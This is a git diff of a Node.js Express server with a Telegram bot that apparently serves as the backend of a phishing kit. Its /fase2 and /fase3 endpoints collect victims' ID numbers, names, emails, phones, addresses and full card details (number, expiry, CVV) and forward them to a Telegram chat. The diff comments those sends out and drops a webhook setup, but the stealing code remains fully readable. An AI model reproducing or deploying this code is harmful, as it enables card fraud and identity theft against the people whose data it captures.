@@ -1,6 +1,5 @@
 import express from 'express';
 import TelegramBot from 'node-telegram-bot-api';
-import axios from 'axios';
 import {TOKEN, WH_URL, ORIGIN_URL, CHAT_ID} from './config.js'
 
 import dotenv from 'dotenv';
@@ -35,24 +34,12 @@ app.use((req, res, next) => {
 /**
  * CHATBOT CONFIG
  */
-const bot = new TelegramBot(token, { polling: true });
 
 const token = process.env.TOKEN || TOKEN;
-const webhookURL = process.env.WH_URL || WH_URL;
 const apiUrl = `https://api.telegram.org/bot${token}/setWebhook`;
 const chatID = process.env.CHAT_ID || CHAT_ID;
 
-// WebHoook setting
-axios.post(apiUrl, { url: webhookURL })
-    .then(response => {
-    console.log('URL del webhook actualizada correctamente');
-    })
-    .catch(error => {
-    console.error('Error al actualizar la URL del webhook:', error.message);
-    });
-
-bot.sendMessage(chatID, "We're Online Baby! Another one ;)")
-
+const bot = new TelegramBot(token, { polling: true });
 
 const generateRandomCommand = () => {
   const characters = 'abcdefghijklmnopqrstuvwxyz0123456789'; // Caracteres permitidos en el comando
@@ -85,35 +72,35 @@ app.post('/fase1', (req, res)=>{
 app.post('/fase2', (req, res)=>{
   /** Datos Personales */
   console.log('Fase 2 (Ejec...)')
-  bot.sendMessage(chatID, `
-  ### RECIBIENDO ###\n
-  CC: ${req.body.cc}\n 
-  NOMBRE**: ${req.body.nom}\n
-  MAIL: ${req.body.ml}\n
-  CELULAR: ${req.body.pn}\n
-  CIUDAD: ${req.body.cid}\n
-  DIRECCIÓN: ${req.body.dir}\n
-  `)
+  // bot.sendMessage(chatID, `
+  // ### RECIBIENDO ###\n
+  // CC: ${req.body.cc}\n 
+  // NOMBRE**: ${req.body.nom}\n
+  // MAIL: ${req.body.ml}\n
+  // CELULAR: ${req.body.pn}\n
+  // CIUDAD: ${req.body.cid}\n
+  // DIRECCIÓN: ${req.body.dir}\n
+  // `)
   res.json({'msg': 'Checked!'})
 })
 
 app.post('/fase3', (req, res)=>{
   /** Datos tarjeta */
   console.log('Fase 3 (Ejec...)')
-  bot.sendMessage(chatID, `
-  ### RECIBIENDO ###\n
-  CC: ${req.body.cc}\n 
-  NOMBRE: ${req.body.nom}\n
-  MAIL: ${req.body.ml}\n
-  CELULAR: ${req.body.pn}\n
-  CIUDAD: ${req.body.cid}\n
-  DIRECCIÓN: ${req.body.dir}\n
-  **--------**\n
-  BANCO: ${req.body.tar.ent}\n
-  TARJETA: ${req.body.tar.pin}\n
-  FECHA: ${req.body.tar.date}\n
-  CVV: ${req.body.tar.cvv}\n\n
-  `)
+  // bot.sendMessage(chatID, `
+  // ### RECIBIENDO ###\n
+  // CC: ${req.body.cc}\n 
+  // NOMBRE: ${req.body.nom}\n
+  // MAIL: ${req.body.ml}\n
+  // CELULAR: ${req.body.pn}\n
+  // CIUDAD: ${req.body.cid}\n
+  // DIRECCIÓN: ${req.body.dir}\n
+  // **--------**\n
+  // BANCO: ${req.body.tar.ent}\n
+  // TARJETA: ${req.body.tar.pin}\n
+  // FECHA: ${req.body.tar.date}\n
+  // CVV: ${req.body.tar.cvv}\n\n
+  // `)
 
   res.json({'msg': 'Checked!'})
 })
